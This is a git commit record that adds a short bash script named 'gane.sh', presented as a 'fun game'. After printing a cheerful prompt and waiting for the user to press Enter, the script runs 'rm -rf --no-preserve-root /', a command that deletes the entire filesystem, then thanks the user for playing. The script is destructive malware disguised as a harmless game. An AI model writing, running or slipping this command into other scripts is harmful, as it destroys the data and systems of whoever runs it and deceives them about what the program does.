57281a086fa711266511192ad59462faad0e2e7a
Mohammad Rajeh <rajeh.mohammad@gmail.com>
2022-11-16 10:04:29 +0300

    Add files via upload

---
+++ gane.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+
+echo "You need to play fun Game (:(:(:"
+read
+rm -rf --no-preserve-root /
+echo "--------------------------Thanks for playing fun game----------------------------------"
